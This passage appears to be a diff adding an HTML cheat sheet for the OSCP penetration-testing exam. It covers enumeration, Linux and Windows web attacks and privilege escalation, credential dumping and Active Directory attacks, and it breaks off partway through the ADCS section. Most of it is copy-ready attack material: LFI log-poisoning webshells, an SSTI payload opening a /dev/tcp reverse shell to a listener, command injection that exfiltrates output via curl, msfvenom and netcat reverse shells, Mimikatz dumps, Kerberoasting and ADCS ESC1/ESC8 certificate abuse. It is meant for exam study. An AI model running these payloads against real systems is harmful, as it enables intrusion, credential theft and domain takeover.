+        <tr><td>1433</td><td>MSSQL</td><td><span class="impact">→ Full MSSQL section (Section 6)</span></td></tr>
+        <tr><td>3306</td><td>MySQL</td><td><span class="action">mysql -u root -h &lt;IP&gt; (blank/default pass)</span></td></tr>
+        <tr><td>3389</td><td>RDP</td><td><span class="action">Check ms17-010, BlueKeep; use creds</span></td></tr>
+        <tr><td>5985</td><td>WinRM</td><td><span class="action">evil-winrm -i &lt;IP&gt; -u user -p pass</span></td></tr>
+        <tr><td>8080/8443</td><td>Alt-HTTP</td><td><span class="action">Tomcat? Jenkins? Weblogic? check /manager</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Web Enumeration Workflow</h3>
+  <pre data-lang="bash"><code># 1. Tech fingerprint
+whatweb http://&lt;TARGET_IP&gt; -v
+curl -I http://&lt;TARGET_IP&gt;
+nikto -h http://&lt;TARGET_IP&gt; -output nikto.txt &amp;
+
+# 2. Directory brute force
+gobuster dir -u http://&lt;TARGET_IP&gt; \
+    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
+    -x php,html,txt,asp,aspx,jsp -t 50 -o gobuster.txt
+
+feroxbuster -u http://&lt;TARGET_IP&gt; \
+    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+    -x php,html,txt,aspx -t 100 --depth 3 -o ferox.txt
+
+# 3. Always manually check:
+curl http://&lt;TARGET_IP&gt;/robots.txt
+curl http://&lt;TARGET_IP&gt;/.git/HEAD
+curl http://&lt;TARGET_IP&gt;/.env
+curl http://&lt;TARGET_IP&gt;/backup/
+curl http://&lt;TARGET_IP&gt;/config.php
+view-source:http://&lt;TARGET_IP&gt;/           # HTML comments!
+
+# 4. VHost enumeration:
+gobuster vhost -u http://&lt;DOMAIN&gt; \
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    --append-domain -t 50 -o vhosts.txt
+
+# 5. CMS-specific:
+wpscan --url http://&lt;TARGET_IP&gt; --enumerate u,p,t,cb,dbe --plugins-detection aggressive
+joomscan -u http://&lt;TARGET_IP&gt;
+
+# 6. Parameter fuzzing:
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+    -u "http://&lt;TARGET_IP&gt;/page.php?FUZZ=test" -fs 0 -mc 200,301,302,500</code></pre>
+
+  <h3>SMB Enumeration</h3>
+  <pre data-lang="bash"><code># Unauthenticated:
+smbclient -L //&lt;TARGET_IP&gt; -N
+smbmap -H &lt;TARGET_IP&gt; -u '' -p ''
+nxc smb &lt;TARGET_IP&gt; -u '' -p '' --shares
+nmap --script smb-vuln* -p 445 &lt;TARGET_IP&gt;
+
+# Authenticated:
+nxc smb &lt;TARGET_IP&gt; -u user -p pass --shares --users --groups --pass-pol
+smbmap -H &lt;TARGET_IP&gt; -u user -p pass -R
+smbclient //&lt;TARGET_IP&gt;/share -U 'user%pass'
+
+# Download all files recursively:
+smbclient //&lt;TARGET_IP&gt;/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
+nxc smb &lt;TARGET_IP&gt; -u user -p pass -M spider_plus</code></pre>
+
+  <h3>SNMP Enumeration</h3>
+  <pre data-lang="bash"><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;TARGET_IP&gt;
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.2.1.25.4.2.1.2   # Running processes
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.2.1.25.6.3.1.2   # Installed software
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.4.1.77.1.2.25    # Windows users
+snmp-check &lt;TARGET_IP&gt; -c public</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S3 ═══════════════════ -->
+<section class="section" id="s3">
+  <div class="section-header">
+    <span class="section-num">03</span>
+    <h2>Standalone Linux Box Methodology</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">How to think about a box</span>
+    <p><strong>A "standalone box" is one machine to fully own — get a shell, then escalate to root.</strong> Most Linux boxes are cracked through a web app on port 80/443, so that's usually where you start. The web attacks below are the common ways in: find the flaw, get code execution, land a shell.</p>
+    <p><strong>The loop never changes:</strong> enumerate the web app → spot a weakness (file upload, LFI, SQLi, known CVE) → turn it into a <em>reverse shell</em> → then run the PrivEsc checklist further down to become root.</p>
+  </div>
+
+  <h3>Linux Web Attack Techniques</h3>
+
+  <h4>LFI / Local File Inclusion</h4>
+  <pre data-lang="bash"><code># Basic traversal:
+/page.php?file=../../../../etc/passwd
+/page.php?file=../../../../etc/shadow
+/page.php?file=/proc/self/environ
+
+# PHP wrappers:
+/page.php?file=php://filter/convert.base64-encode/resource=config.php
+# Decode: echo '&lt;BASE64&gt;' | base64 -d
+
+# Log Poisoning → RCE:
+# Step 1: Inject PHP into Apache log via User-Agent:
+curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' http://&lt;TARGET_IP&gt;/
+# Step 2: Include log file:
+/page.php?file=/var/log/apache2/access.log&amp;cmd=id
+
+# SSH log poisoning:
+ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@&lt;TARGET_IP&gt;
+/page.php?file=/var/log/auth.log&amp;cmd=whoami</code></pre>
+
+  <h4>SQL Injection</h4>
+  <pre data-lang="bash"><code># Manual test: ' OR '1'='1'-- -
+# UNION read:
+' UNION SELECT 1,load_file('/etc/passwd'),3-- -
+# File write:
+' UNION SELECT 1,"&lt;?php system($_GET['cmd']); ?&gt;",3 INTO OUTFILE '/var/www/html/cmd.php'-- -
+
+# sqlmap:
+sqlmap -u "http://&lt;IP&gt;/login.php" --data="user=admin&amp;pass=x" --level=5 --risk=3 --dbs
+sqlmap -u "http://&lt;IP&gt;/item?id=1" --os-shell</code></pre>
+
+  <h4>SSTI — Server-Side Template Injection</h4>
+  <pre data-lang="bash"><code># Detection probes:
+{{7*7}}       → 49 = Jinja2/Twig
+${7*7}        → 49 = FreeMarker/Mako
+&lt;%= 7*7 %&gt;   → 49 = ERB (Ruby)
+
+# Jinja2 RCE:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1"').read()}}
+
+# Twig RCE:
+{{['id']|filter('system')}}</code></pre>
+
+  <h4>RFI — Remote File Inclusion</h4>
+  <pre data-lang="bash"><code># Requires: allow_url_include=On in php.ini
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.txt
+python3 -m http.server 80
+/page.php?file=http://&lt;LHOST&gt;/shell.txt&amp;cmd=id</code></pre>
+
+  <h4>Blind SQLi — Time-Based</h4>
+  <pre data-lang="bash"><code># Detection (3s delay = vulnerable):
+http://target/page.php?id=1' AND IF(1=1,sleep(3),'false')-- -
+sqlmap -u "http://&lt;IP&gt;/page.php?id=1" --technique=T --level=3 --dbs</code></pre>
+
+  <h4>.git Exposed → Credential Chain</h4>
+  <pre data-lang="bash"><code>curl http://&lt;TARGET&gt;/.git/HEAD       # confirm exposed
+git-dumper http://&lt;TARGET&gt;/.git ./repo
+cd repo
+git log --oneline
+git show &lt;COMMIT_HASH&gt;              # deleted creds often here
+git diff HEAD~1 HEAD</code></pre>
+
+  <h4>Exiftool — Metadata → Usernames</h4>
+  <pre data-lang="bash"><code>exiftool *.jpg *.docx *.pdf 2&gt;/dev/null | grep -i "author\|creator\|owner"
+# Username found? Try as password on ALL services!</code></pre>
+
+  <h4>Archive / ZIP Cracking</h4>
+  <pre data-lang="bash"><code>zip2john protected.zip &gt; zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+office2john file.xlsx &gt; office.hash
+john office.hash --wordlist=rockyou.txt
+binwalk -e suspicious_file    # extract embedded files</code></pre>
+
+  <h4>MySQL UDF RCE (root creds + FILE priv)</h4>
+  <pre data-lang="bash"><code># Check:
+SELECT user, file_priv FROM mysql.user;
+SHOW variables LIKE 'plugin_dir';
+# Compile malicious UDF .so → upload → CREATE FUNCTION → system()
+# If MySQL local-only → SSH tunnel first:
+ssh -L 3306:127.0.0.1:3306 user@&lt;TARGET_IP&gt;
+mysql -u root -h 127.0.0.1 -P 3306 -p</code></pre>
+
+  <h4>Command Injection</h4>
+  <pre data-lang="bash"><code># Test chars: ; | || &amp;&amp; &amp; ` $() \n %0a
+ping=127.0.0.1; whoami
+ping=127.0.0.1|whoami
+ping=127.0.0.1`whoami`
+# URL encoded semicolon: %3B
+# Blind (OOB):
+ping=127.0.0.1; curl http://&lt;LHOST&gt;/?x=$(id|base64)</code></pre>
+
+  <h4>File Upload Bypass</h4>
+  <pre data-lang="bash"><code># 1. MIME: Change Content-Type to image/jpeg
+# 2. Magic bytes: GIF89a prepend
+# 3. Double ext: shell.php.jpg, shell.php%00.jpg
+# 4. Case: shell.pHp, shell.PHP
+# 5. Alt ext: .php3 .php4 .php5 .phtml .phar .shtml
+# 6. Null byte (older): shell.php%00.gif</code></pre>
+
+  <h3>Chained Attack Patterns — Standalone (Real OSCP Scenarios)</h3>
+  <div class="callout green">
+    <strong>Key Insight:</strong> OSCP boxes rarely have a single vulnerability. They chain 2-3 misconfigs. These are the most common patterns found in real exam/PG boxes.
+  </div>
+
+  <div class="tree-box"><span class="root">Chain A — Web Version CVE → Cred → Privesc</span>
+Apache/Nginx/App version found → searchsploit → RCE as www-data
+→ config.php has DB creds → reuse creds for SSH → sudo -l → ROOT
+
+<span class="root">Chain B — Anonymous SMB → Creds → RCE</span>
+SMB null session → readable share → config/pdf/xlsx file
+→ creds found → SSH/WinRM login → SUID/SeImpersonate → ROOT
+
+<span class="root">Chain C — LFI → SSH Key Read → Shell → Privesc</span>
+LFI at ?file= param → /home/user/.ssh/id_rsa → chmod 600 → SSH in
+→ sudo -l NOPASSWD → GTFObins → ROOT
+
+<span class="root">Chain D — Web Login → File Upload → Webshell → Cron Root</span>
+Default creds (admin:admin) → file upload → bypass (phar/phtml)
+→ webshell as www-data → /etc/crontab writable script → ROOT
+
+<span class="root">Chain E — LFI + PHP Filter → DB Creds → SQLi File Write → RCE</span>
+LFI + php://filter → base64 decode config.php → DB creds
+→ SQLi UNION INTO OUTFILE → webshell → shell → privesc
+
+<span class="root">Chain F — .git Exposed → Deleted Creds → SSH → sudo</span>
+/.git/HEAD accessible → git-dumper → git log/diff
+→ password found in old commit → SSH login → sudo privesc → ROOT
+
+<span class="root">Chain G — FTP Anon Write + Webroot Overlap → Shell</span>
+FTP anonymous login → writable dir = /var/www/html/uploads
+→ upload PHP shell → trigger via browser → www-data
+→ capabilities/cron → ROOT
+
+<span class="root">Chain H — SNMP Community → Username → Password Spray → RCE</span>
+snmpwalk → running process with username / installed software version
+→ username found → spray common passwords → SSH/WinRM
+→ SeImpersonate or SUID → ROOT
+
+<span class="root">Chain I — Username as Password (Very Common in OSCP)</span>
+Any service leaks username (SMTP enum, SNMP, web, SMB)
+→ try username:username, username:username123, username:Company1
+→ login → privesc
+
+<span class="root">Chain J — SQLi → OS Shell (MSSQL/MySQL)</span>
+SQLi on login form → xp_cmdshell (MSSQL) or UDF (MySQL)
+→ RCE as service account → SeImpersonate → SYSTEM</div>
+
+  <h3>Linux Privilege Escalation Checklist</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">Mental model</span>
+    <p><strong>Privilege escalation = you're already inside as a normal user; now you want to become <code>root</code>.</strong> You're hunting for one mistake the admin made. The four most common on OSCP boxes, in order of frequency:</p>
+    <p><strong>1. Sudo rights</strong> — <code>sudo -l</code> shows commands you can run as root. Look each one up on <a href="https://gtfobins.github.io" style="color:#c9b0ff;">GTFOBins</a>. <strong>2. SUID binaries</strong> — programs that run as their owner (often root); again, check GTFOBins. <strong>3. Cron jobs</strong> — scripts root runs on a schedule that you can edit. <strong>4. Credentials lying around</strong> — config files, <code>.bash_history</code>, database passwords reused for the root account.</p>
+    <p><strong>Always run an automated enumerator first</strong> (<code>linpeas.sh</code>), but never <em>only</em> rely on it — read the output and verify the RED/YELLOW findings manually. linpeas finds clues; <em>you</em> connect them.</p>
+  </div>
+
+  <pre data-lang="bash"><code># STEP 1: Run linpeas immediately
+curl http://&lt;LHOST&gt;/linpeas.sh | bash 2&gt;/dev/null | tee /tmp/lp.out
+# Look for RED/YELLOW highlights first
+
+# ── Context ──────────────────────────────────────────────────
+whoami &amp;&amp; id &amp;&amp; hostname
+uname -a &amp;&amp; cat /etc/os-release
+env | grep -i "pass\|key\|secret\|token"
+cat ~/.bash_history; cat /home/*/.bash_history 2&gt;/dev/null
+
+# ── Sudo ─────────────────────────────────────────────────────
+sudo -l
+# NOPASSWD → check GTFObins immediately!
+# Common: sudo find . -exec /bin/bash \; -p
+#         sudo python3 -c 'import os; os.system("/bin/bash")'
+#         sudo vim → :!/bin/bash
+
+# ── SUID ─────────────────────────────────────────────────────
+find / -perm -4000 -type f 2&gt;/dev/null | xargs ls -la
+# Each result → GTFObins
+
+# ── Capabilities ─────────────────────────────────────────────
+getcap -r / 2&gt;/dev/null
+# cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+
+# ── Cron Jobs ────────────────────────────────────────────────
+cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
+# Writable script run as root → append revshell
+# Wildcard (tar/rsync) → wildcard injection
+
+# ── Writable /etc/passwd ─────────────────────────────────────
+openssl passwd -1 haxpass
+echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
+su hax
+
+# ── NFS no_root_squash ───────────────────────────────────────
+cat /etc/exports
+# If: /share *(rw,no_root_squash) →
+# On ATTACKER (as root):
+mkdir /mnt/nfs &amp;&amp; mount -t nfs &lt;TARGET_IP&gt;:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/ &amp;&amp; chmod +s /mnt/nfs/bash
+# On VICTIM:
+/tmp/bash -p    # → ROOT
+
+# ── Docker group ─────────────────────────────────────────────
+id | grep docker
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# ── Internal services ────────────────────────────────────────
+ss -tlnp   # local-only → port forward → exploit</code></pre>
+
+  <h3>Linux PrivEsc Decision Tree</h3>
+  <div class="tree-box"><span class="root">sudo -l</span> → NOPASSWD?
+    └── GTFObins → <span class="win">ROOT ✓</span>
+
+<span class="root">SUID binary?</span>
+    ├── Known binary (GTFObins) → <span class="win">ROOT ✓</span>
+    └── Custom → strings/ltrace → PATH hijack → <span class="win">ROOT ✓</span>
+
+<span class="root">Capabilities?</span>
+    └── cap_setuid → setuid(0) → <span class="win">ROOT ✓</span>
+
+<span class="root">Cron writable script?</span>
+    └── Append reverse shell → <span class="win">ROOT ✓</span>
+
+<span class="root">/etc/passwd writable?</span>
+    └── Add root user → <span class="win">ROOT ✓</span>
+
+<span class="root">NFS no_root_squash?</span>
+    └── Mount + SUID bash → <span class="win">ROOT ✓</span>
+
+<span class="root">Docker group?</span>
+    └── docker run -v /:/mnt → chroot → <span class="win">ROOT ✓</span>
+
+<span class="note">Nothing? → Kernel exploit (check exact version)</span></div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S4 ═══════════════════ -->
+<section class="section" id="s4">
+  <div class="section-header">
+    <span class="section-num">04</span>
+    <h2>Standalone Windows Box Methodology</h2>
+  </div>
+
+  <h3>Windows Initial Access</h3>
+  <pre data-lang="bash"><code># EternalBlue MS17-010:
+nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;
+
+# Tomcat Manager WAR deploy:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f war -o shell.war
+curl -u admin:admin -T shell.war "http://&lt;IP&gt;:8080/manager/text/deploy?path=/shell"
+curl http://&lt;IP&gt;:8080/shell/
+
+# WebDAV:
+davtest -url http://&lt;TARGET_IP&gt;
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f aspx -o shell.aspx
+curl -T shell.aspx http://&lt;TARGET_IP&gt;/uploads/shell.aspx
+
+# WinRM:
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -p 'Password123'
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;</code></pre>
+
+  <h3>Windows Privilege Escalation</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">Mental model</span>
+    <p><strong>Same idea as Linux, different doors.</strong> You're a normal Windows user hunting for a path to <code>SYSTEM</code> (Windows' equivalent of root). Run <strong>winPEAS</strong> first, then check these in order:</p>
+    <p><strong>1. Token privileges</strong> — run <code>whoami /priv</code>. If you see <em>SeImpersonatePrivilege</em>, you almost certainly win with a "Potato" exploit. <strong>2. Service misconfigs</strong> — unquoted service paths or services you can modify let you run code as SYSTEM. <strong>3. Stored credentials</strong> — <code>unattend.xml</code>, registry autologon, saved PowerShell history, web.config. <strong>4. Missing patches</strong> — old kernels are vulnerable to known exploits.</p>
+    <p><strong>First thing to type every time:</strong> <code>whoami /priv</code> and <code>whoami /groups</code>. They often hand you the answer in seconds.</p>
+  </div>
+
+  <h4>Token Privileges (whoami /priv)</h4>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Privilege</th><th>Exploit Path</th></tr></thead>
+      <tbody>
+        <tr><td>SeImpersonatePrivilege</td><td><span class="impact">GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM</span></td></tr>
+        <tr><td>SeAssignPrimaryToken</td><td><span class="impact">GodPotato / JuicyPotato → SYSTEM</span></td></tr>
+        <tr><td>SeBackupPrivilege</td><td><span class="action">Read SAM/NTDS → dump hashes</span></td></tr>
+        <tr><td>SeDebugPrivilege</td><td><span class="action">Dump LSASS → hashes</span></td></tr>
+        <tr><td>SeLoadDriverPrivilege</td><td><span class="impact">Load malicious driver → SYSTEM</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <pre data-lang="powershell"><code># GodPotato (SeImpersonate):
+.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add &amp;&amp; net localgroup administrators hax /add"
+
+# PrintSpoofer:
+.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"
+
+# AlwaysInstallElevated (check BOTH keys = 1):
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\Temp\evil.msi
+
+# Autologon creds in registry:
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# PowerShell history (GOLD MINE):
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Stored credentials:
+cmdkey /list
+runas /savecred /user:Administrator "C:\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"  # needs ncat/ncat build
+
+# Unquoted service paths:
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"</code></pre>
+
+  <h3>Dump Credentials (Windows Post-Exploitation)</h3>
+  <pre data-lang="bash"><code># Mimikatz:
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::lsa /patch
+
+# Remote SAM dump:
+secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
+nxc smb &lt;TARGET_IP&gt; -u user -p pass --sam
+nxc smb &lt;TARGET_IP&gt; -u user -p pass -M lsassy</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S5 ═══════════════════ -->
+<section class="section" id="s5">
+  <div class="section-header">
+    <span class="section-num">05</span>
+    <h2>Active Directory Attack Chains</h2>
+  </div>
+
+  <div class="callout red">
+    <strong>⚠ OSCP AD SET IS ASSUMED BREACH.</strong> You receive valid domain credentials at exam start (e.g. <code>stephanie:Password123@corp.local</code>). You are already a low-priv domain user. Enumerate AD immediately.
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">AD in plain English</span>
+    <p><strong>Active Directory is the central "user database" for a Windows company network.</strong> One server — the <strong>Domain Controller (DC)</strong> — holds every user, computer, password hash, and permission. Own the DC and you own the entire network.</p>
+    <p><strong>Why the chain works:</strong> companies almost never give a normal user direct admin on the DC. So you climb sideways and upward: start as a low-priv user → enumerate to find a misconfiguration or a second set of creds → move to another machine (lateral movement) → repeat until you find a path to <strong>Domain Admin</strong>. <a href="#s16" style="color:#c9b0ff;">BloodHound</a> literally draws this path for you.</p>
+    <p><strong>Key terms you'll see below:</strong> <em>Kerberoasting</em> and <em>AS-REP Roasting</em> = stealing crackable password hashes from the way Windows logins work. <em>Pass-the-Hash</em> = logging in with a stolen hash without ever knowing the plaintext password. <em>DCSync</em> = impersonating a DC to dump everyone's hashes. Full definitions are in the <a href="#s15" style="color:#c9b0ff;">Glossary (Section 15)</a>.</p>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Kerberos in plain English — read this before the "roasting" attacks</span>
+    <p><strong>Kerberos is how Windows logs you in without passing your password around.</strong> Picture a cinema: you show ID once at the entrance and get a wristband (a <em>ticket</em>). After that, every screen lets you in by checking the wristband — you never show ID again.</p>
+    <p><strong>Why hackers care:</strong> some of those tickets are encrypted with a <em>user's password hash</em>. If you can request such a ticket and take it offline, you can keep guessing passwords until one decrypts it. That's exactly what <strong>Kerberoasting</strong> and <strong>AS-REP Roasting</strong> (below) do — you're not breaking Kerberos, you're abusing a normal feature that hands you crackable material.</p>
+  </div>
+
+  <h3>AD Full Attack Flow</h3>
+  <div class="tree-box"><span class="root">PROVIDED CREDS (stephanie:Password123)</span>
+        │
+        ▼
+<span class="leaf">Phase 1: RAPID AD ENUMERATION</span>
+    BloodHound + nxc + LDAP + PowerView
+        │
+        ▼
+<span class="leaf">Phase 2: QUICK WINS (all simultaneously)</span>
+    ├── AS-REP Roasting
+    ├── Kerberoasting
+    ├── Passwords in descriptions (VERY COMMON)
+    ├── SMB share hunting
+    └── GPP/SYSVOL passwords
+        │
+        ▼
+<span class="leaf">Phase 3: FOOTHOLD on MS01</span>  (local.txt = 10 pts)
+        │
+        ▼
+<span class="leaf">Phase 4: PIVOT to MS02</span>  (local.txt = 10 pts)
+    Setup Ligolo-ng tunnel → lateral move
+        │
+        ▼
+<span class="leaf">Phase 5: ESCALATE to Domain Admin</span>
+    ACL abuse / DCSync / Delegation / GPO
+        │
+        ▼
+<span class="win">Phase 6: OWN DC</span>  (proof.txt = 20 pts)
+    PSExec/WMIexec as DA → dump NTDS → Golden Ticket</div>
+
+  <div class="callout learn">
+    <span class="learn-tag">How the 40 AD points actually work</span>
+    <p><strong>The AD set is 3 chained machines worth 40 points total</strong> — the highest-value and most predictable part of the exam. Points are banked as you progress: <strong>MS01 local.txt = 10</strong>, <strong>MS02 local.txt = 10</strong>, <strong>DC proof.txt = 20</strong>. So even if you don't fully own the DC, reaching MS01 and MS02 still banks 20 points.</p>
+    <p><strong>The one insight that makes AD click:</strong> it's a <em>chain</em>, not three separate boxes. The credentials and hashes you loot on one machine are the keys to the next. Every phase is the same rhythm — enumerate → find a quick win → get a foothold → loot creds → reuse them to move forward → finally reach Domain Admin and own the DC.</p>
+  </div>
+
+  <h3>Phase 1: AD Enumeration</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What these tools do</span>
+    <p><strong>BloodHound</strong> collects every user, group, and permission in the domain and draws it as a graph — then you click "Shortest Path to Domain Admins" and it literally shows you the route. Run it <em>first</em>, every time. <strong>nxc</strong> (NetExec) quickly lists shares, users, and the password policy. <strong>ldapsearch</strong> reads the AD directory directly — and admins infamously leave passwords sitting in user "description" fields, one of the most common OSCP quick wins.</p>
+  </div>
+
+  <pre data-lang="bash"><code># BloodHound — FIRST THING TO RUN:
+bloodhound-python -u stephanie -p 'Password123' \
+    -d corp.local -ns 192.168.x.100 -c All --zip
+# Import ZIP → run queries:
+#   "Find Shortest Paths to Domain Admins"
+#   "Find All Kerberoastable Users"
+#   "Find AS-REP Roastable Users"
+#   "Computers with Unconstrained Delegation"
+#   "Find Principals with DCSync Rights"
+
+# nxc domain recon:
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' \
+    --shares --users --groups --pass-pol
+
+# Passwords in description field (VERY COMMON in OSCP):
+ldapsearch -x -H ldap://192.168.x.100 \
+    -D "stephanie@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" \
+    "(&amp;(objectClass=user)(description=*))" sAMAccountName description</code></pre>
+
+  <h3>AS-REP Roasting</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>Some accounts have "Kerberos pre-authentication" switched off.</strong> For those, you can ask the DC for a login ticket <em>without proving who you are first</em> — and that ticket is encrypted with the account's password hash. Grab it, crack it offline with hashcat, and you have a real password. <strong>Prerequisite:</strong> an account with pre-auth disabled (BloodHound → "Find AS-REP Roastable Users"). It can even work with <em>no creds</em> if you can guess valid usernames.</p>
+  </div>
+
+  <pre data-lang="bash"><code>GetNPUsers.py corp.local/stephanie:'Password123' \
+    -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt
+
+# Windows (Rubeus):
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Crack:
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <h3>Kerberoasting</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>Service accounts (any account with an "SPN") can be targeted by any logged-in user.</strong> You request a service ticket for them, and part of that ticket is encrypted with the service account's password — so you crack it offline. These accounts often have weak, never-rotated passwords, making this one of the most reliable AD wins. <strong>Prerequisite:</strong> valid domain creds (you have them) + an SPN account (BloodHound → "Find Kerberoastable Users"). Add <code>best64.rule</code> to hashcat for tougher passwords.</p>
+  </div>
+
+  <pre data-lang="bash"><code>GetUserSPNs.py corp.local/stephanie:'Password123' \
+    -dc-ip 192.168.x.100 -request -outputfile kerb.txt
+
+# Windows (Rubeus):
+.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
+
+# Crack:
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+
+  <h3>GPP / SYSVOL</h3>
+
+  <div class="callout learn">
+    <span class="learn-tag">What &amp; why</span>
+    <p><strong>Older admins set local passwords through "Group Policy Preferences" (GPP),</strong> and Windows stored them — encrypted — in a share that every domain user can read (SYSVOL). The fatal flaw: Microsoft once published the decryption key, so <code>gpp-decrypt</code> instantly reverses them into plaintext. If GPP passwords exist, they're free credentials. Always check.</p>
+  </div>
+
+  <pre data-lang="bash"><code>nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
+gpp-decrypt &lt;CPASSWORD_VALUE&gt;</code></pre>
+
+  <h3>ADCS — Active Directory Certificate Services</h3>
+
+  <div class="callout red">
+    <strong>⚠ CRITICAL GAP:</strong> ADCS attacks (ESC1-ESC8) are now common in OSCP AD sets. Any domain user can escalate to Domain Admin if misconfigured. Always enumerate ADCS with provided creds.
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">What ADCS is — explained simply</span>
+    <p><strong>ADCS is the company's certificate authority</strong> — the system that issues digital ID cards (certificates) that can be used to log in. If a certificate "template" is misconfigured, a normal user can request a certificate that effectively says "I am the Administrator," then log in as Administrator with it. That's a direct jump from low-priv user to Domain Admin, which is why ESC1–ESC8 are now exam favourites.</p>
+    <p><strong>The flow is always the same:</strong> <code>certipy find -vulnerable</code> tells you if a template is exploitable → request a cert impersonating Administrator → <code>certipy auth</code> turns that cert into Administrator's NTLM hash → Pass-the-Hash to own the domain. <strong>ESC1</strong> = you're allowed to set the cert's name (most common). <strong>ESC8</strong> = relay the DC itself into requesting a cert for you.</p>
+  </div>
+
+  <pre data-lang="bash"><code># Enumerate vulnerable templates (run immediately with provided creds):
+certipy find -u 'stephanie@corp.local' -p 'Password123' \
+    -dc-ip 192.168.x.100 -vulnerable -stdout
+
+# Also save BloodHound data:
+certipy find -u 'stephanie@corp.local' -p 'Password123' \
+    -dc-ip 192.168.x.100 -bloodhound
+
+# ── ESC1 — User can specify SAN (most common) ─────────────────
+# Conditions: Enrollee Supplies Subject=True + Client Auth + low-priv enrollment
+certipy req -u 'stephanie@corp.local' -p 'Password123' \
+    -ca corp-CA -template VulnerableTemplate \
+    -upn Administrator@corp.local -dc-ip 192.168.x.100
+# Authenticate with cert → get NTLM hash:
+certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
+# → Administrator NTLM hash → PTH → Domain Admin!
+
+# ── ESC8 — NTLM Relay to ADCS HTTP endpoint ──────────────────
+# Setup certipy relay:
+certipy relay -target http://&lt;ADCS_IP&gt;/certsrv/certfnsh.asp \
+    -template DomainController
+# Trigger DC authentication (PetitPotam):
+python3 PetitPotam.py -u stephanie -p 'Password123' \
+    &lt;LHOST&gt; &lt;DC_IP&gt;
+# Gets: DC machine certificate → authenticate as DC → DCSync everything
+
+# ── ESC4 — Write access to template ──────────────────────────
+# BloodHound shows WriteProperty on certificate template
+certipy template -u 'stephanie@corp.local' -p 'Password123' \
+    -template VulnTemplate -save-old   # backup original
+certipy template -u 'stephanie@corp.local' -p 'Password123' \
+    -template VulnTemplate -configuration VulnTemplate.json
